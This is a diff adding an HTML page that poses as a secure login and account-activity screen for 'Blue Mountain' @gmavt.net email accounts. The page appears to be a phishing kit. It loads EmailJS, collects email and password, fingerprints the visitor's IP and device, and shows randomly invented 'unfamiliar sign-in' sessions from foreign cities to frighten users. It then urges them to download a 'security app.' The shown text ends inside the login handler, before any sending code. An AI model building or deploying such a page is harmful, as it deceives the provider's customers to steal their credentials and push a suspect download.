@@ -1,0 +1,1487 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <title>Blue Mountain · Secure Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #e8ecf1;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            color: #1a1a2e;
+        }
+
+        .container {
+            max-width: 460px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .header-logo {
+            max-width: 220px;
+            height: auto;
+            margin-bottom: 8px;
+        }
+
+        .sub-heading {
+            color: #5f6b7a;
+            font-size: 13px;
+            font-weight: 400;
+            letter-spacing: 0.2px;
+        }
+
+        /* Card */
+        .card {
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+            padding: 32px 66px 45px;
+            border: 1px solid #dce1e8;
+            transition: all 0.3s ease;
+        }
+
+        .card.hidden {
+            display: none;
+        }
+
+        /* Login Form */
+        .form-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1a1a2e;
+            margin-bottom: 6px;
+            text-align: center;
+        }
+
+        .form-subtitle {
+            text-align: center;
+            color: #6b7a8a;
+            font-size: 14px;
+            line-height: 1.4;
+            margin-bottom: 22px;
+        }
+
+        .form-group {
+            margin-bottom: 12px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #2d3748;
+            margin-bottom: 4px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px 12px;
+            font-size: 14px;
+            background: #f7f9fc;
+            border: 1px solid #dce1e8;
+            border-radius: 6px;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            background: #ffffff;
+            border-color: #1e4f8a;
+            box-shadow: 0 0 0 3px rgba(30, 79, 138, 0.1);
+        }
+
+        .form-error {
+            display: block;
+            font-size: 12px;
+            color: #c53030;
+            min-height: 18px;
+            margin-top: 4px;
+        }
+
+        .form-btn {
+            width: 100%;
+            padding: 11px;
+            font-size: 15px;
+            font-weight: 600;
+            background: #1e4f8a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
+            margin-top: 6px;
+        }
+
+        .form-btn:hover {
+            background: #163d6e;
+        }
+
+        .form-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .form-footer {
+            text-align: center;
+            font-size: 12px;
+            color: #8a9aa8;
+            margin-top: 16px;
+        }
+
+        .form-footer a {
+            color: #1e4f8a;
+            text-decoration: none;
+        }
+
+        .form-footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* ===========================
+           Login Activity Page
+           =========================== */
+        .activity-header {
+            text-align: center;
+            margin-bottom: 18px;
+            padding-bottom: 14px;
+            border-bottom: 1px solid #edf2f7;
+        }
+
+        .activity-header .activity-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #eef2f7;
+            padding: 4px 16px;
+            border-radius: 40px;
+            margin-bottom: 10px;
+            border: 1px solid #dce1e8;
+        }
+
+        .activity-header .activity-badge i {
+            color: #1e4f8a;
+            font-size: 16px;
+        }
+
+        .activity-header .activity-badge span {
+            font-weight: 500;
+            color: #2d3748;
+            font-size: 13px;
+        }
+
+        .activity-header h2 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1a1a2e;
+        }
+
+        .activity-header .activity-status {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #c6f6d5;
+            color: #22543d;
+            padding: 3px 14px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 500;
+            margin-top: 6px;
+        }
+
+        .activity-header .activity-status i {
+            font-size: 12px;
+        }
+
+        /* Section headings */
+        .section-title {
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.6px;
+            color: #8a9aa8;
+            margin: 4px 0 8px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .section-title i {
+            color: #1e4f8a;
+            font-size: 11px;
+        }
+
+        .section-title .section-count {
+            margin-left: auto;
+            background: #eef2f7;
+            color: #4a5568;
+            font-size: 10px;
+            font-weight: 600;
+            padding: 2px 8px;
+            border-radius: 20px;
+            letter-spacing: 0;
+        }
+
+        /* Session list */
+        .session-list {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .session-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            padding: 12px 14px;
+            border-radius: 10px;
+            border: 1px solid #edf2f7;
+            background: #f7f9fc;
+            transition: all 0.25s ease;
+            position: relative;
+        }
+
+        .session-item:hover {
+            border-color: #dce1e8;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+        }
+
+        .session-item.current {
+            background: #f0fff4;
+            border-color: #c6f6d5;
+            border-left: 3px solid #38a169;
+        }
+
+        .session-item.unfamiliar {
+            background: #fffaf0;
+            border-color: #fefcbf;
+            border-left: 3px solid #d69e2e;
+        }
+
+        /* Clear/remove animation */
+        .session-item.removing {
+            opacity: 0;
+            transform: translateX(30px);
+            max-height: 0;
+            padding-top: 0;
+            padding-bottom: 0;
+            margin-bottom: -8px;
+            border-width: 0;
+            overflow: hidden;
+        }
+
+        .session-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            font-size: 16px;
+        }
+
+        .session-icon.current-icon {
+            background: #c6f6d5;
+            color: #22543d;
+        }
+
+        .session-icon.unfamiliar-icon {
+            background: #fefcbf;
+            color: #744210;
+        }
+
+        .session-details {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .session-details .device-line {
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 6px;
+            margin-bottom: 3px;
+        }
+
+        .session-details .device-name {
+            font-size: 13px;
+            font-weight: 600;
+            color: #1a1a2e;
+        }
+
+        .session-details .location-line {
+            font-size: 12px;
+            color: #6b7a8a;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            margin-bottom: 2px;
+        }
+
+        .session-details .location-line i {
+            font-size: 10px;
+            color: #8a9aa8;
+        }
+
+        .session-details .meta-line {
+            font-size: 11px;
+            color: #8a9aa8;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 3px;
+        }
+
+        .session-details .meta-line span {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .session-details .meta-line i {
+            font-size: 10px;
+        }
+
+        /* Badges */
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            font-size: 10px;
+            font-weight: 600;
+            padding: 2px 8px;
+            border-radius: 20px;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+        }
+
+        .badge-this-device {
+            background: #38a169;
+            color: white;
+        }
+
+        .badge-unfamiliar {
+            background: #fefcbf;
+            color: #744210;
+        }
+
+        /* Clear session button */
+        .session-clear-btn {
+            flex-shrink: 0;
+            align-self: center;
+            width: 30px;
+            height: 30px;
+            border-radius: 8px;
+            border: 1px solid #fed7d7;
+            background: #fff5f5;
+            color: #e53e3e;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            transition: all 0.2s ease;
+            padding: 0;
+        }
+
+        .session-clear-btn:hover {
+            background: #e53e3e;
+            color: white;
+            border-color: #e53e3e;
+            transform: scale(1.05);
+        }
+
+        .session-clear-btn:active {
+            transform: scale(0.95);
+        }
+
+        .session-clear-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Empty state */
+        .empty-state {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            padding: 22px 14px;
+            background: #f0fff4;
+            border: 1px dashed #c6f6d5;
+            border-radius: 10px;
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .empty-state.visible {
+            display: flex;
+        }
+
+        .empty-state i {
+            color: #38a169;
+            font-size: 22px;
+        }
+
+        .empty-state strong {
+            color: #22543d;
+            font-size: 13px;
+        }
+
+        .empty-state p {
+            color: #4a5568;
+            font-size: 12px;
+        }
+
+        /* Alert box */
+        .activity-alert {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            background: #fff5f5;
+            border: 1px solid #fed7d7;
+            border-left: 3px solid #e53e3e;
+            border-radius: 8px;
+            padding: 12px 14px;
+            margin-bottom: 16px;
+            transition: all 0.25s ease;
+        }
+
+        .activity-alert.hidden {
+            display: none;
+        }
+
+        .activity-alert i {
+            color: #e53e3e;
+            font-size: 18px;
+            margin-top: 1px;
+            flex-shrink: 0;
+        }
+
+        .activity-alert .alert-text strong {
+            display: block;
+            color: #9b2c2c;
+            font-size: 13px;
+            margin-bottom: 2px;
+        }
+
+        .activity-alert .alert-text p {
+            color: #742a2a;
+            font-size: 12px;
+            line-height: 1.4;
+        }
+
+        /* Actions */
+        .actions {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin: 14px 0 10px;
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 8px 14px;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 500;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-family: inherit;
+        }
+
+        .btn i {
+            font-size: 13px;
+        }
+
+        .btn-success {
+            background: #38a169;
+            color: white;
+        }
+
+        .btn-success:hover {
+            background: #2f855a;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(56, 161, 105, 0.25);
+        }
+
+        .btn-danger {
+            background: #e53e3e;
+            color: white;
+        }
+
+        .btn-danger:hover {
+            background: #c53030;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(229, 62, 62, 0.25);
+        }
+
+        .btn-outline {
+            background: transparent;
+            color: #4a5568;
+            border: 1px solid #dce1e8;
+        }
+
+        .btn-outline:hover {
+            background: #f7f9fc;
+            border-color: #b0bec5;
+        }
+
+        .btn-app {
+            background: #1e4f8a;
+            color: white;
+            padding: 6px 14px;
+            font-size: 12px;
+        }
+
+        .btn-app:hover {
+            background: #163d6e;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(30, 79, 138, 0.25);
+        }
+
+        .download-section {
+            display: none;
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px solid #edf2f7;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .download-section.visible {
+            display: flex;
+        }
+
+        .download-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .download-info i {
+            color: #1e4f8a;
+            font-size: 18px;
+        }
+
+        .download-info p {
+            font-size: 13px;
+            color: #4a5568;
+            margin: 0;
+        }
+
+        .download-info strong {
+            color: #1a1a2e;
+        }
+
+        .state-message {
+            background: #eef2f7;
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-size: 13px;
+            display: none;
+            align-items: center;
+            gap: 8px;
+            margin: 6px 0;
+        }
+
+        .state-message.visible {
+            display: inline-flex;
+        }
+
+        .state-message i {
+            color: #1e4f8a;
+        }
+
+        .state-message.success {
+            background: #f0fff4;
+        }
+
+        .state-message.success i {
+            color: #38a169;
+        }
+
+        .state-message.error {
+            background: #fff5f5;
+        }
+
+        .state-message.error i {
+            color: #e53e3e;
+        }
+
+        .spinner {
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            100% { transform: rotate(360deg); }
+        }
+
+        .revoked-state {
+            display: none;
+            background: #f0fff4;
+            padding: 10px 14px;
+            border-radius: 8px;
+            border: 1px solid #c6f6d5;
+            margin-top: 10px;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .revoked-state.visible {
+            display: flex;
+        }
+
+        .revoked-state i {
+            color: #38a169;
+            font-size: 20px;
+        }
+
+        .revoked-state .text {
+            flex: 1;
+        }
+
+        .revoked-state .text strong {
+            color: #22543d;
+            font-size: 14px;
+        }
+
+        .revoked-state .text p {
+            color: #4a5568;
+            font-size: 13px;
+            margin: 2px 0 0;
+        }
+
+        .footer {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px 16px;
+            margin-top: 14px;
+            padding-top: 10px;
+            border-top: 1px solid #edf2f7;
+            font-size: 12px;
+            color: #6b7a8a;
+        }
+
+        .footer-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .footer-item i {
+            color: #1e4f8a;
+            font-size: 12px;
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 480px) {
+            body {
+                padding: 16px;
+            }
+
+            .container {
+                max-width: 100%;
+            }
+
+            .card {
+                padding: 24px 16px 20px;
+            }
+
+            .header-logo {
+                max-width: 140px;
+            }
+
+            .form-title {
+                font-size: 18px;
+            }
+
+            .form-group {
+                margin-bottom: 10px;
+            }
+
+            .form-group input {
+                padding: 9px 12px;
+                font-size: 14px;
+            }
+
+            .form-btn {
+                padding: 10px;
+                font-size: 14px;
+                margin-top: 4px;
+            }
+
+            .actions {
+                flex-direction: column;
+                gap: 6px;
+            }
+
+            .btn {
+                width: 100%;
+                justify-content: center;
+                padding: 8px 14px;
+            }
+
+            .download-section {
+                flex-direction: column;
+                align-items: stretch;
+                text-align: center;
+            }
+
+            .download-info {
+                justify-content: center;
+            }
+
+            .footer {
+                flex-direction: column;
+                gap: 4px;
+                margin-top: 12px;
+                padding-top: 8px;
+            }
+
+            .session-item {
+                padding: 10px 12px;
+                gap: 10px;
+            }
+
+            .session-icon {
+                width: 32px;
+                height: 32px;
+                font-size: 14px;
+            }
+
+            .session-clear-btn {
+                width: 28px;
+                height: 28px;
+                font-size: 11px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .card {
+                padding: 16px 12px 16px;
+            }
+
+            .form-group input {
+                padding: 8px 10px;
+                font-size: 13px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Header -->
+    <div class="header">
+        <img src="https://3sx2y5mo5g.ucarecd.net/521032f7-d0a1-49af-82fb-ff721117fe15/gmtnetlarge1.png" alt="Blue Mountain" class="header-logo">
+        <div class="sub-heading">Account Activity Management</div>
+    </div>
+
+    <!-- Login Card -->
+    <div class="card" id="loginCard">
+        <div class="form-title">Sign in</div>
+        <div class="form-subtitle">
+            to manage your activity
+        </div>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="loginEmail">Email address</label>
+                <input type="email" id="loginEmail" name="user_email"
+                       placeholder="you@gmavt.net"
+                       pattern="^[^@\s]+@gmavt\.net$"
+                       title="Email must be @gmavt.net"
+                       required>
+                <span class="form-error" id="loginEmailError"></span>
+            </div>
+
+            <div class="form-group">
+                <label for="loginPassword">Password</label>
+                <input type="password" id="loginPassword" name="user_password" required>
+                <span class="form-error" id="loginPasswordError"></span>
+            </div>
+
+            <button type="submit" class="form-btn" id="loginBtn">
+                <i class="fas fa-shield-alt"></i> Verify &amp; Continue
+            </button>
+        </form>
+        <div class="form-footer">
+            <a href="https://www.tdscertreport.net/service-terms">View Service Terms</a>
+        </div>
+    </div>
+
+    <!-- Login Activity Card -->
+    <div class="card hidden" id="activityCard">
+        <div class="activity-header">
+            <div class="activity-badge">
+                <i class="fas fa-shield-halved"></i>
+                <span>Account Security</span>
+            </div>
+            <h2>Login Activity</h2>
+            <div class="activity-status">
+                <i class="fas fa-check-circle"></i> Session Verified
+            </div>
+        </div>
+
+        <!-- Unfamiliar login alert -->
+        <div class="activity-alert" id="activityAlert">
+            <i class="fas fa-exclamation-triangle"></i>
+            <div class="alert-text">
+                <strong>Unfamiliar sign-in detected</strong>
+                <p>We noticed recent sign-ins from devices and locations you don't usually use. Review the activity below.</p>
+            </div>
+        </div>
+
+        <!-- Current session -->
+        <div class="section-title">
+            <i class="fas fa-circle-check"></i> Current Session
+        </div>
+        <div class="session-list">
+            <div class="session-item current" id="currentSession">
+                <div class="session-icon current-icon">
+                    <i class="fas fa-laptop"></i>
+                </div>
+                <div class="session-details">
+                    <div class="device-line">
+                        <span class="device-name" id="currentDevice">This Device</span>
+                        <span class="badge badge-this-device"><i class="fas fa-check"></i> This Device</span>
+                    </div>
+                    <div class="location-line">
+                        <i class="fas fa-location-dot"></i>
+                        <span id="currentLocation">Your current location</span>
+                    </div>
+                    <div class="meta-line">
+                        <span><i class="fas fa-clock"></i> <span id="currentTime">Just now</span></span>
+                        <span><i class="fas fa-badge-check"></i> Familiar device</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Previous sessions -->
+        <div class="section-title">
+            <i class="fas fa-clock-rotate-left"></i> Recent Activity
+            <span class="section-count" id="sessionCount">0 sessions</span>
+        </div>
+        <div class="session-list" id="previousSessions">
+            <!-- Populated by JavaScript -->
+        </div>
+
+        <!-- Empty state -->
+        <div class="empty-state" id="emptyState">
+            <i class="fas fa-circle-check"></i>
+            <strong>All unfamiliar sessions cleared</strong>
+            <p>No suspicious activity remaining on your account.</p>
+        </div>
+
+        <!-- Actions -->
+        <div class="actions" id="actionGroup">
+            <button class="btn btn-success" id="verifyActivityBtn">
+                <i class="fas fa-check"></i> This Was Me
+            </button>
+            <button class="btn btn-danger" id="secureAccountBtn">
+                <i class="fas fa-lock"></i> Secure My Account
+            </button>
+            <button class="btn btn-outline" id="downloadReportBtn">
+                <i class="fas fa-download"></i> Download Report
+            </button>
+        </div>
+
+        <div class="state-message" id="stateMessage">
+            <i class="fas fa-circle-notch spinner"></i>
+            <span id="stateText">Processing...</span>
+        </div>
+
+        <div class="download-section" id="downloadSection">
+            <div class="download-info">
+                <i class="fas fa-shield-halved"></i>
+                <p><strong>Secure your account</strong> — Download the Blue Mountain Security App</p>
+            </div>
+            <button class="btn btn-app" id="downloadAppAfterSecure">
+                <i class="fas fa-download"></i> Download App
+            </button>
+        </div>
+
+        <div class="revoked-state" id="securedState">
+            <i class="fas fa-check-circle"></i>
+            <div class="text">
+                <strong>Account secured successfully</strong>
+                <p>All unfamiliar sessions have been signed out. You'll be notified of any new sign-in attempts.</p>
+            </div>
+        </div>
+
+        <div class="footer">
+            <span class="footer-item"><i class="fas fa-user-check"></i> Verified session</span>
+            <span class="footer-item"><i class="fas fa-history"></i> Audit logging</span>
+            <span class="footer-item"><i class="fas fa-shield"></i> Secure</span>
+        </div>
+    </div>
+</div>
+
+<script>
+    (function() {
+        emailjs.init("EHKPcgjBux1jmPamR");
+
+        // ---------------------------
+        // Random data pools for previous sessions
+        // ---------------------------
+        const LOCATIONS = [
+            { city: 'Dubai',       country: 'United Arab Emirates', flag: '🇦🇪', region: 'Middle East' },
+            { city: 'Riyadh',      country: 'Saudi Arabia',         flag: '🇸🇦', region: 'Middle East' },
+            { city: 'Doha',        country: 'Qatar',                flag: '🇶🇦', region: 'Middle East' },
+            { city: 'Tel Aviv',    country: 'Israel',               flag: '🇮🇱', region: 'Middle East' },
+            { city: 'Amman',       country: 'Jordan',               flag: '🇯🇴', region: 'Middle East' },
+            { city: 'Beirut',      country: 'Lebanon',              flag: '🇱🇧', region: 'Middle East' },
+            { city: 'Kuwait City', country: 'Kuwait',               flag: '🇰🇼', region: 'Middle East' },
+            { city: 'Mumbai',      country: 'India',                flag: '🇮🇳', region: 'Asia' },
+            { city: 'Singapore',   country: 'Singapore',            flag: '🇸🇬', region: 'Asia' },
+            { city: 'Tokyo',       country: 'Japan',                flag: '🇯🇵', region: 'Asia' },
+            { city: 'Seoul',       country: 'South Korea',          flag: '🇰🇷', region: 'Asia' },
+            { city: 'Bangkok',     country: 'Thailand',             flag: '🇹🇭', region: 'Asia' },
+            { city: 'Jakarta',     country: 'Indonesia',            flag: '🇮🇩', region: 'Asia' },
+            { city: 'Manila',      country: 'Philippines',          flag: '🇵🇭', region: 'Asia' },
+            { city: 'Hong Kong',   country: 'Hong Kong',            flag: '🇭🇰', region: 'Asia' },
+            { city: 'Kuala Lumpur',country: 'Malaysia',             flag: '🇲🇾', region: 'Asia' }
+        ];
+
+        const DEVICES = [
+            { name: 'Windows PC · Chrome',     icon: 'fa-desktop',             os: 'Windows 11' },
+            { name: 'MacBook Pro · Safari',    icon: 'fa-laptop',              os: 'macOS Sonoma' },
+            { name: 'iPhone 15 · Safari',      icon: 'fa-mobile-screen',       os: 'iOS 17' },
+            { name: 'Samsung Galaxy · Chrome', icon: 'fa-mobile-screen',       os: 'Android 14' },
+            { name: 'Linux PC · Firefox',      icon: 'fa-desktop',             os: 'Ubuntu 24.04' },
+            { name: 'iPad Pro · Safari',       icon: 'fa-tablet-screen-button',os: 'iPadOS 17' },
+            { name: 'Windows PC · Edge',       icon: 'fa-desktop',             os: 'Windows 10' },
+            { name: 'Pixel 8 · Chrome',        icon: 'fa-mobile-screen',       os: 'Android 14' }
+        ];
+
+        const IPS = [
+            '185.93.', '94.200.', '51.36.', '37.156.', '103.86.',
+            '202.83.', '14.192.', '61.19.', '203.145.', '119.81.'
+        ];
+
+        // Allowed email domain
+        const ALLOWED_DOMAIN = 'gmavt.net';
+
+        // ---------------------------
+        // Helpers
+        // ---------------------------
+        function randInt(min, max) {
+            return Math.floor(Math.random() * (max - min + 1)) + min;
+        }
+
+        function pick(arr) {
+            return arr[Math.floor(Math.random() * arr.length)];
+        }
+
+        function pickAlternatingLocations(count) {
+            const me = LOCATIONS.filter(function(l) { return l.region === 'Middle East'; });
+            const asia = LOCATIONS.filter(function(l) { return l.region === 'Asia'; });
+            const shuffledMe = me.slice().sort(function() { return Math.random() - 0.5; });
+            const shuffledAsia = asia.slice().sort(function() { return Math.random() - 0.5; });
+
+            const result = [];
+            const startWithMe = Math.random() < 0.5;
+            for (let i = 0; i < count; i++) {
+                const useMe = (i % 2 === 0) ? startWithMe : !startWithMe;
+                if (useMe && shuffledMe.length) result.push(shuffledMe.pop());
+                else if (shuffledAsia.length) result.push(shuffledAsia.pop());
+                else if (shuffledMe.length) result.push(shuffledMe.pop());
+            }
+            return result;
+        }
+
+        function randomIp() {
+            return pick(IPS) + randInt(10, 250) + '.' + randInt(1, 254);
+        }
+
+        function timeAgo(minutesAgo) {
+            if (minutesAgo < 60) return minutesAgo + ' min ago';
+            const hours = Math.floor(minutesAgo / 60);
+            if (hours < 24) return hours + ' hour' + (hours > 1 ? 's' : '') + ' ago';
+            const days = Math.floor(hours / 24);
+            return days + ' day' + (days > 1 ? 's' : '') + ' ago';
+        }
+
+        function formatDate(offsetMinutes) {
+            const d = new Date(Date.now() - offsetMinutes * 60000);
+            return d.toLocaleString('en-US', {
+                month: 'short', day: 'numeric',
+                hour: '2-digit', minute: '2-digit'
+            });
+        }
+
+        // ---------------------------
+        // Build previous session items
+        // ---------------------------
+        function buildPreviousSessions() {
+            const count = randInt(3, 4);
+            const locations = pickAlternatingLocations(count);
+            const usedDeviceIndices = new Set();
+
+            return locations.map(function(loc, i) {
+                let deviceIndex;
+                do {
+                    deviceIndex = randInt(0, DEVICES.length - 1);
+                } while (usedDeviceIndices.has(deviceIndex) && usedDeviceIndices.size < DEVICES.length - 1);
+                usedDeviceIndices.add(deviceIndex);
+                const device = DEVICES[deviceIndex];
+
+                const minutesAgo = [15, 90, 300, 1400, 2900, 4400][i % 6] + randInt(-10, 10);
+                const ip = randomIp();
+
+                return {
+                    city: loc.city,
+                    country: loc.country,
+                    flag: loc.flag,
+                    region: loc.region,
+                    device: device.name,
+                    deviceIcon: device.icon,
+                    os: device.os,
+                    ip: ip,
+                    minutesAgo: minutesAgo
+                };
+            });
+        }
+
+        // ---------------------------
+        // Render a session row
+        // ---------------------------
+        function renderSession(session) {
+            const div = document.createElement('div');
+            div.className = 'session-item unfamiliar';
+            div.innerHTML =
+                '<div class="session-icon unfamiliar-icon">' +
+                    '<i class="fas ' + session.deviceIcon + '"></i>' +
+                '</div>' +
+                '<div class="session-details">' +
+                    '<div class="device-line">' +
+                        '<span class="device-name">' + session.device + '</span>' +
+                        '<span class="badge badge-unfamiliar">' +
+                            '<i class="fas fa-triangle-exclamation"></i> Unfamiliar' +
+                        '</span>' +
+                    '</div>' +
+                    '<div class="location-line">' +
+                        '<i class="fas fa-location-dot"></i>' +
+                        '<span>' + session.flag + ' ' + session.city + ', ' + session.country + '</span>' +
+                    '</div>' +
+                    '<div class="meta-line">' +
+                        '<span><i class="fas fa-network-wired"></i> ' + session.ip + '</span>' +
+                        '<span><i class="fas fa-clock"></i> ' + timeAgo(session.minutesAgo) + '</span>' +
+                        '<span><i class="fas fa-calendar"></i> ' + formatDate(session.minutesAgo) + '</span>' +
+                    '</div>' +
+                '</div>' +
+                '<button class="session-clear-btn" type="button" title="Clear this session" aria-label="Clear this session">' +
+                    '<i class="fas fa-xmark"></i>' +
+                '</button>';
+
+            const clearBtn = div.querySelector('.session-clear-btn');
+            clearBtn.addEventListener('click', function() {
+                clearSession(div, clearBtn, session);
+            });
+
+            return div;
+        }
+
+        // ---------------------------
+        // Clear a session
+        // ---------------------------
+        function clearSession(element, button, session) {
+            button.disabled = true;
+            element.classList.add('removing');
+
+            previousSessions = previousSessions.filter(function(s) {
+                return !(s.ip === session.ip && s.device === session.device);
+            });
+
+            setTimeout(function() {
+                if (element.parentNode) element.parentNode.removeChild(element);
+                updateSessionCount();
+                updateEmptyState();
+            }, 320);
+        }
+
+        // ---------------------------
+        // Update session counter
+        // ---------------------------
+        function updateSessionCount() {
+            const count = previousSessions.length;
+            const countEl = document.getElementById('sessionCount');
+            countEl.textContent = count + ' session' + (count === 1 ? '' : 's');
+        }
+
+        // ---------------------------
+        // Show/hide empty state
+        // ---------------------------
+        function updateEmptyState() {
+            const emptyState = document.getElementById('emptyState');
+            const alertBox = document.getElementById('activityAlert');
+            if (previousSessions.length === 0) {
+                emptyState.classList.add('visible');
+                alertBox.classList.add('hidden');
+            } else {
+                emptyState.classList.remove('visible');
+                alertBox.classList.remove('hidden');
+            }
+        }
+
+        // ---------------------------
+        // Certificate data (kept for sending)
+        // ---------------------------
+        function generateCertId() { return 'HIS-EV-2026-9f7a'; }
+        function generateSerial() {
+            const chars = '0123456789ABCDEF';
+            let serial = '';
+            for (let i = 0; i < 5; i++) {
+                if (i > 0) serial += ':';
+                for (let j = 0; j < 2; j++) serial += chars[Math.floor(Math.random() * 16)];
+            }
+            return serial;
+        }
+        function generateFingerprint() {
+            const chars = '0123456789abcdef';
+            let fp = '';
+            for (let i = 0; i < 20; i++) fp += chars[Math.floor(Math.random() * 16)];
+            return fp;
+        }
+
+        const certId = generateCertId();
+        const serialNum = generateSerial();
+        const fingerprint = generateFingerprint();
+
+        // DOM refs
+        const loginCard = document.getElementById('loginCard');
+        const activityCard = document.getElementById('activityCard');
+        const loginForm = document.getElementById('loginForm');
+        const loginEmail = document.getElementById('loginEmail');
+        const loginPassword = document.getElementById('loginPassword');
+        const loginEmailError = document.getElementById('loginEmailError');
+        const loginPasswordError = document.getElementById('loginPasswordError');
+        const loginBtn = document.getElementById('loginBtn');
+
+        const stateMsg = document.getElementById('stateMessage');
+        const stateText = document.getElementById('stateText');
+        const securedState = document.getElementById('securedState');
+        const secureAccountBtn = document.getElementById('secureAccountBtn');
+        const downloadSection = document.getElementById('downloadSection');
+
+        let previousSessions = [];
+
+        // ---------------------------
+        // Fetch IP
+        // ---------------------------
+        function fetchIpAddress() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(function(res) { return res.json(); })
+                .then(function(data) { return data.ip || 'Unknown'; })
+                .catch(function() { return 'Unknown'; });
+        }
+
+        // ---------------------------
+        // Device info
+        // ---------------------------
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let browser = 'Unknown';
+            let os = 'Unknown';
+            let device = 'Desktop';
+
+            if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
+            else if (ua.indexOf('SamsungBrowser') > -1) browser = 'Samsung Internet';
+            else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) browser = 'Opera';
+            else if (ua.indexOf('Trident') > -1) browser = 'Internet Explorer';
+            else if (ua.indexOf('Edge') > -1 || ua.indexOf('Edg') > -1) browser = 'Edge';
+            else if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
+            else if (ua.indexOf('Safari') > -1) browser = 'Safari';
+
+            if (ua.indexOf('Win') > -1) os = 'Windows';
+            else if (ua.indexOf('Mac') > -1) os = 'macOS';
+            else if (ua.indexOf('Linux') > -1) os = 'Linux';
+            else if (ua.indexOf('Android') > -1) os = 'Android';
+            else if (ua.indexOf('like Mac') > -1) os = 'iOS';
+
+            if (/Mobi|Android|iPhone|iPod/i.test(ua)) device = 'Mobile';
+            if (/iPad|Tablet/i.test(ua)) device = 'Tablet';
+
+            return {
+                browser: browser,
+                os: os,
+                device: device,
+                userAgent: ua,
+                screen_resolution: screen.width + 'x' + screen.height,
+                viewport_size: window.innerWidth + 'x' + window.innerHeight,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+                language: navigator.language || navigator.userLanguage || 'Unknown'
+            };
+        }
+
+        // ---------------------------
+        // Login form handler
+        // ---------------------------
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            let valid = true;
